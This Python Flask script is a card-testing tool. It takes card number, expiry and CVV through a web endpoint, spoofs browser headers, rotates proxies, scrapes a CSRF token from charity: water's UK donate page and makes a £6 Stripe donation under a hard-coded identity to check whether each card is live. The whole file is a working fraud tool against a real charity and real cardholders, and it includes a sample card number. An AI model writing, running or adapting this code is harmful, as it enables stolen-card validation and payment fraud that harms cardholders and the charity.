
from flask import Flask, request, jsonify
from typing import Dict, Optional
from bs4 import BeautifulSoup
from requests.exceptions import HTTPError, Timeout, ProxyError, ConnectionError

import requests
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)


def parse_proxy(proxy_str: str) -> Dict[str, str]:
    """Parse proxy string: ip:port:user:pass -> requests proxies dict."""
    parts = proxy_str.strip().split(":")
    if len(parts) == 4:
        ip, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        proxy_url = f"http://{ip}:{port}"
    else:
        raise ValueError("Proxy format must be ip:port:user:pass or ip:port")
    return {
        "http": proxy_url,
        "https": proxy_url
    }


def extract_error(response_json: Optional[dict]) -> Dict[str, str]:
    """Pull code/message from any Stripe-like error payload."""
    if not isinstance(response_json, dict):
        return {"code": "unknown", "message": "empty or invalid response"}
    err = response_json.get("error") or {}
    return {
        "code": err.get("code") or err.get("type") or "unknown",
        "message": err.get("message") or err.get("decline_code") or "unknown error"
    }


class DonationApi:
    def __init__(self, proxy_str: Optional[str] = None):
        self.session = requests.Session()
        self.base = "https://www.charitywater.org"
        if proxy_str:
            self.session.proxies = parse_proxy(proxy_str)

    def get_csrf_token(self) -> Dict[str, str]:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        }
        try:
            r = self.session.get(
                f"{self.base}/uk/donate",
                headers=headers,
                timeout=10
            )
            r.raise_for_status()

            sp = BeautifulSoup(r.text, "html.parser")
            token_tag = sp.find("meta", {"name": "csrf-token"}) or \
                        sp.find("input", {"name": "csrf-token"})

            if token_tag:
                value = token_tag.get("content") or token_tag.get("value")
                logger.info(f"Found CSRF token: {value}")
                return {"success": "found csrf token.", "value": value}
            else:
                logger.warning("CSRF token not found in page")
                return {"error": "csrf token not found.", "code": r.status_code}

        except (Timeout, ConnectionError, ProxyError) as e:
            logger.error(f"Connection failed: {str(e)[:50]}")
            return {"error": f"Connection failed: {str(e)[:50]}"}
        except HTTPError as e:
            logger.error(f"HTTP error: {e.response.status_code}")
            return {"error": f"HTTP error: {e.response.status_code}"}

    def payment_method(self, cc: str, mm: str, yy: str, cvv: str) -> Dict[str, str]:
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/"
        }
        data = {
            'type': 'card',
            'billing_details[address][postal_code]': '03063',
            'billing_details[address][country]': 'GB',
            'billing_details[email]': 'raven.us@icloud.com',
            'billing_details[name]': 'Hasan Bakash',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': '103d3874-1751-4f54-8840-c5dd535f0088e071aa',
            'muid': 'b8e7fcbe-6e29-4187-aad4-7850b6e8fc54fc69f4',
            'sid': '15fd20f8-6c6b-4880-a06a-27f40fc86dbfa6f54b',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/7c9a63d3d1; stripe-js-v3/7c9a63d3d1; card-element',
            'referrer': 'https://www.charitywater.org',
            'time_on_page': '262897',
            'client_attribution_metadata[client_session_id]': '3596a0b3-6a90-46a4-9051-fba3be623d5d',
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'client_attribution_metadata[wallet_config_id]': '35cfa3cc-d87a-4d4d-9550-9c27356e3c04',
            'key': 'pk_live_51CaTsZFMuyZwj3nIjOUReNRmcb3Re08jxgpGuUE3OaG1szF0yhLUvGs9LWA6TUnDOMzpDYZqR8qg973ctZWSEVFl00D84cm1J9'
        }
        try:
            r = self.session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=headers,
                data=data,
                timeout=15
            )
            r.raise_for_status()
            response = r.json()
            pm_id = response.get("id")
            if pm_id:
                logger.info(f"found payment method id ({pm_id})")
                return {"status": "success", "id": pm_id}
            else:
                err = extract_error(response)
                logger.warning(f"Stripe error: {err}")
                return {"status": "error", **err}

        except HTTPError as e:
            try:
                body = e.response.json()
                err = extract_error(body)
                logger.error(f"Stripe HTTP {e.response.status_code}: {err}")
                return {"status": "error", "http_status": str(e.response.status_code), **err}
            except Exception:
                logger.error(f"HTTP error: {e.response.status_code}")
                return {"error": f"HTTP error: {e.response.status_code}"}
        except (Timeout, ConnectionError, ProxyError) as e:
            logger.error(f"Connection failed: {str(e)[:50]}")
            return {"error": f"Connection failed: {str(e)[:50]}"}

    def donate(self, cc: str, mm: str, yy: str, cvv: str) -> Dict[str, str]:
        csrf = self.get_csrf_token()
        if "error" in csrf:
            return {"error": "cannot proceed without csrf token."}

        csrf_value = csrf.get("value")
        if not csrf_value:
            return {"error": "csrf token value is empty."}

        pm = self.payment_method(cc, mm, yy, cvv)
        if pm.get("status") == "error" or "error" in pm:
            return {
                "error": "cannot proceed without payment method.",
                "details": {k: v for k, v in pm.items() if k not in ("status",)}
            }

        pm_id = pm.get("id")
        if not pm_id:
            return {"error": "payment method id is empty."}

        headers = {
            "X-Csrf-Token": csrf_value,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.charitywater.org",
            "Referer": "https://www.charitywater.org/uk/donate"
        }
        data = {
            'country': 'uk',
            'payment_intent[email]': 'raven.us@icloud.com',
            'payment_intent[amount]': '6',
            'payment_intent[currency]': 'gbp',
            'payment_intent[metadata][donation_kind]': 'water',
            'payment_intent[payment_method]': pm_id,
            'disable_existing_subscription_check': 'false',
            'donation_form[amount]': '6',
            'donation_form[anonymous]': 'true',
            'donation_form[email]': 'raven.us@icloud.com',
            'donation_form[name]': 'Hasan',
            'donation_form[payment_monthly_subscription]': 'false',
            'donation_form[surname]': 'Bakash',
            'donation_form[campaign_id]': 'ac8d24f6-c88f-4412-820f-d5b4b6bf10b7',
            'donation_form[metadata][donation_kind]': 'water',
            'donation_form[metadata][email_consent_granted]': 'false',
            'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/uk/donate',
            'donation_form[metadata][phone_number_consent_granted]': 'false',
            'donation_form[metadata][strict_consent_region]': 'true',
            'donation_form[metadata][url_params][touch_type]': '1',
            'donation_form[metadata][session_url_params][touch_type]': '1',
            'donation_form[metadata][with_saved_payment]': 'false',
            'donation_form[iho_attributes][amount_hidden]': 'false',
            'donation_form[iho_attributes][delivery_notification]': 'false',
            'donation_form[iho_attributes][design]': 'in-memory-us',
            'donation_form[iho_attributes][send_to]': 'honoree',
            'donation_form[iho_attributes][type]': 'email',
            'idempotency_key': '1337279a-82a0-4c01-bca0-9ef9d7abbcf3'
        }
        try:
            r = self.session.post(
                f"{self.base}/donate/stripe",
                headers=headers,
                data=data,
                timeout=15
            )
            r.raise_for_status()
            response = r.json()

            if response.get("error"):
                err = extract_error(response)
                logger.info(f"Donation error: {err}")
                return {"status": "error", **err}
            elif response.get("success"):
                logger.info("payment success")
                return {"status": "success", "message": "charged $6"}
            else:
                logger.warning(f"unexpected response: {response}")
                return {"status": "unknown", "response": str(response)}

        except HTTPError as e:
            try:
                body = e.response.json()
                err = extract_error(body)
                logger.error(f"Donate HTTP {e.response.status_code}: {err}")
                return {"status": "error", "http_status": str(e.response.status_code), **err}
            except Exception:
                logger.error(f"HTTP error: {e.response.status_code}")
                return {"error": f"HTTP error: {e.response.status_code}"}
        except (Timeout, ConnectionError, ProxyError) as e:
            logger.error(f"Connection failed: {str(e)[:50]}")
            return {"error": f"Connection failed: {str(e)[:50]}"}


app = Flask(__name__)


@app.route("/donate", methods=["GET"])
def donate_endpoint():
    """
    GET /donate?cc=4347697074080646|10|28|746&proxy=ip:port:user:pass
    """
    cc_param = request.args.get("cc", "")
    proxy_param = request.args.get("proxy", "")

    if not cc_param:
        return jsonify({"error": "missing cc param. format: cc=number|mm|yy|cvv"}), 400

    parts = cc_param.split("|")
    if len(parts) != 4:
        return jsonify({"error": "invalid cc format. expected: number|mm|yy|cvv"}), 400

    cc, mm, yy, cvv = parts

    api = DonationApi(proxy_str=proxy_param if proxy_param else None)
    result = api.donate(cc, mm, yy, cvv)
    return jsonify(result)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
